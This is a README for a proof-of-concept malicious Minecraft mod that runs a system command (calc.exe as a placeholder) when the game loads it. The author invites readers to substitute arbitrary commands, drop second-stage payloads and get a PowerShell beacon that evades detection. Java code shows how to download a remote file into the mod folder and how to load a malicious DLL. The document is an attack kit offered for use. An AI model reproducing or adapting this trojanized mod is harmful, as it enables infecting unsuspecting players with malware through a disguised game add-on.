# A malicious Minecraft mod

This is a Minecraft mod that can be compiled into a .jar file, dropped in the mods/ folder, and loaded into Minecraft.
Once the `onClientSetup` class is called on initialization the mod will execute the command `calc.exe`, popping the calulator app. 
Replace this command to execute arbitrary commands on the system and drop second stage payloads.


### Code
The code responsible for launching commands calls the `Runtime.getRuntime().exec()` function. 
![256880772-ce3c1902-74aa-4715-833b-aecf5354cb83](https://github.com/nickswink/mc-payload-mod/assets/57839593/6fceec6d-020d-497a-92ce-4398b39e43db)


### Execution
As Minecraft initializes the mod the command is executed.
![256880861-e1dfbc4d-068c-42e3-9e55-a6ed2e1635bf](https://github.com/nickswink/mc-payload-mod/assets/57839593/6b20fbbe-e7b4-40af-aa61-2b1027e72c02)


### Beacon poc
Executing a powershell paylaod to get a beacon on the remote host. (Seems to help with evasion as well)
![256903518-1cd888b5-855e-452e-80fa-c7aff1b891c5](https://github.com/nickswink/mc-payload-mod/assets/57839593/ff959f26-76a0-4d2c-a75f-816862d5a906)


### DOwnloads (dll sideloading)
| Maybe if you want to drop a file without running `Runtime.getRuntime().exec()` which is kinda sketchy anyway. 

```java
import java.io.BufferedInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;

public void downloadFile(String urlStr, String savePath) throws IOException {
    URL url = new URL(urlStr);
    URLConnection connection = url.openConnection();
    try (BufferedInputStream inputStream = new BufferedInputStream(connection.getInputStream());
         FileOutputStream fileOutputStream = new FileOutputStream(savePath)) {

        byte[] dataBuffer = new byte[1024];
        int bytesRead;
        while ((bytesRead = inputStream.read(dataBuffer, 0, 1024)) != -1) {
            fileOutputStream.write(dataBuffer, 0, bytesRead);
        }
    }
}

try {
    String fileUrl = "https://example.com/your_file.txt";
    String savePath = "path/to/your_minecraft_mod_folder/your_file.txt";
    downloadFile(fileUrl, savePath);
    System.out.println("File downloaded successfully!");
} catch (IOException e) {
    e.printStackTrace();
    System.out.println("File download failed!");
}

```

### Manually load a malicious Dll
| Maybe I will want to manually load (instead of sideloading) a malicious dll i've dropped

```java
import java.nio.file.Files;
import java.nio.file.Paths;

String libraryName = "your_dll_name_without_extension";
try {
    System.loadLibrary(libraryName);
    System.out.println("DLL loaded successfully.");
} catch (UnsatisfiedLinkError e) {
    System.out.println("DLL not found. Loading from file...");
    loadDllFromFile(libraryName);
}

private void loadDllFromFile(String libraryName) {
    String dllPath = "path/to/your_mod_directory/lib/" + libraryName + ".dll";
    if (Files.exists(Paths.get(dllPath))) {
        try {
            System.load(dllPath);
            System.out.println("DLL loaded from file successfully.");
        } catch (UnsatisfiedLinkError e) {
            System.out.println("Failed to load DLL from file: " + e.getMessage());
        }
    } else {
        System.out.println("DLL not found in the specified location: " + dllPath);
    }
}



```

